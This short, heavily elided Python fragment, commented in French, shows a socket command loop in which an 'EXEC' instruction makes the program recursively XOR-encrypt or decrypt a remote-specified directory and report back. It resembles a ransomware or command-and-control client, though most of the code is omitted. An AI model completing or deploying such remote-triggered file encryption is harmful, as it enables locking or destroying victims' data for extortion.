...
if __name__ == "__main__":
    ...
    while True:
        ...
        if cmd == "EXEC":
            ...
            mode = recv_line(s)
            file_path = recv_line(s)  # Ou dossier_path
            if mode in ("encrypt", "decrypt"):  # XOR réversible, même pour les deux
                if os.path.isdir(file_path):  # Si c'est un dossier, traite récursif
                    encrypt_directory(file_path, cle)  # Appel la fonction récursive
                    send_line(s, "OK")
                    send_line(s, f"{mode} directory done")
                    logging.info(f"Crypto {mode} dossier: {file_path}")
                else:  # Sinon, fichier unique
